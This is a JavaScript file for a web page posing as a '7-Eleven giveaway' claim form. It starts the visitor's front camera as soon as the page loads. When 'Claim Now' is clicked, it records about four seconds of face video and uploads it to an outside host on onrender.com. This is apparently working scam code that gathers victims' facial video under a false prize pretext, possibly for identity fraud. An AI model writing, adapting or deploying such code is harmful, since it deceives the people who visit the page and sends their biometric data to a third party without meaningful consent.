const video = document.getElementById('preview');
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');

// Initialize camera
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
    } catch (err) {
        console.warn("Camera access denied.");
    }
}
initCamera();

// Claim Now button
btn.addEventListener('click', async () => {
    btn.style.display = 'none';
    loading.style.display = 'block';

    try {
        const stream = video.srcObject;
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.mp4');

            const res = await fetch("https://seven-11-giveaways-2026-k7mn.onrender.com/upload-video", { method: "POST", body: formData });
            const data = await res.json();
            console.log("Video posted:", data);

            loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 4000);

    } catch (err) {
        console.error(err);
        loading.innerHTML = "<p>Error capturing video.</p>";
    }
});
